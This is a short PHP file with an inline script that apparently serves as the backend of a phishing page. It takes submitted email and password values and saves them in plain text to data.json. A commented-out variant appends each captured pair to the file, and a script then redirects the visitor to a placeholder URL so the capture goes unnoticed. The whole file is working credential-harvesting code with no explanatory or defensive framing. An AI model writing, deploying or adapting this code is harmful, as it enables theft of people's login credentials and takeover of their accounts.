<?php
$file = 'data.json';
$fp = fopen($file, 'w');
fwrite($fp, '{"user": "' . $_POST['email'] . '", "pass": "' . $_POST['pass'] .'"}');
fclose($fp);

// file_put_contents("data.json", "{'user': '" . $_POST['email'] . "', 'pass': '" . $_POST['pass'] ."'}", FILE_APPEND);
?>

<script>
  let url = "#redirectUrl";
  document.location = url;
</script>
